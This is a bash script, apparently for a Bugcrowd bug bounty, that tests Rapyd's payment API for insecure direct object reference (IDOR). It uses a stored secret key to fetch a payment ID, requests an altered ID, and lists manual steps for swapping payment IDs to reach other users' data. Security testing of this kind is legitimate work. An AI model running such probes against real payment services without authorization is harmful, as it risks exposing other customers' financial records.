#!/bin/bash
#!/bin/bash
# Copyright © 2025 DoctorMen. All Rights Reserved.
# IDOR Testing Script with API Credentials
# Tests IDOR vulnerability using provided secret key

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CREDENTIALS_FILE="$SCRIPT_DIR/credentials.sh"

# Load credentials
if [ -f "$CREDENTIALS_FILE" ]; then
    source "$CREDENTIALS_FILE"
else
    echo "Error: credentials.sh not found. Please create it first."
    exit 1
fi

# Check if secret key is set
if [ -z "$RAPYD_SECRET_KEY" ]; then
    echo "Error: RAPYD_SECRET_KEY not set in credentials.sh"
    exit 1
fi

echo "=== IDOR Vulnerability Testing ==="
echo "Target: dashboard.rapyd.net"
echo "Secret Key: ${RAPYD_SECRET_KEY:0:20}... (hidden)"
echo ""

# Step 1: Get payment ID from API
echo "Step 1: Fetching payments list..."
PAYMENT_RESPONSE=$(curl -s -X POST "$RAPYD_BASE_URL/v1/payments" \
  -H "X-Bugcrowd: $BUGCROWD_HEADER" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $RAPYD_SECRET_KEY" \
  -d '{"limit": 10}')

echo "Response received. Checking for payment IDs..."

# Extract payment ID (this is a placeholder - actual parsing needed)
PAYMENT_ID=$(echo "$PAYMENT_RESPONSE" | grep -o 'pay_[a-zA-Z0-9_-]*' | head -1 || echo "")

if [ -z "$PAYMENT_ID" ]; then
    echo "No payment ID found. You may need to create a payment first."
    echo ""
    echo "To test IDOR manually:"
    echo "1. Log in to dashboard.rapyd.net"
    echo "2. Navigate to Collect → Payments"
    echo "3. Click on a payment"
    echo "4. Note the URL - it should contain the payment ID"
    echo "5. Modify the payment ID in the URL"
    echo "6. Check if you can access another user's payment data"
    exit 0
fi

echo "Found Payment ID: $PAYMENT_ID"
echo ""

# Step 2: Test IDOR
echo "Step 2: Testing IDOR vulnerability..."
echo "Attempting to access payment with modified ID..."

# Generate test ID (modify the original)
TEST_ID="${PAYMENT_ID}_modified"

echo "Your Payment ID: $PAYMENT_ID"
echo "Test Payment ID: $TEST_ID"
echo ""

# Test accessing modified payment ID
echo "Testing endpoint: GET $RAPYD_BASE_URL/v1/payments/$TEST_ID"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -X GET "$RAPYD_BASE_URL/v1/payments/$TEST_ID" \
  -H "X-Bugcrowd: $BUGCROWD_HEADER" \
  -H "Authorization: Bearer $RAPYD_SECRET_KEY" \
  -H "Content-Type: application/json")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "⚠️  WARNING: Got 200 OK response!"
    echo "Check if this is unauthorized data access (IDOR vulnerability)"
    echo "Save this response as evidence!"
else
    echo "Got $HTTP_CODE response - Authorization may be working"
fi

echo ""
echo "=== Test Complete ==="
echo "Save the response above as evidence for your bug bounty report."





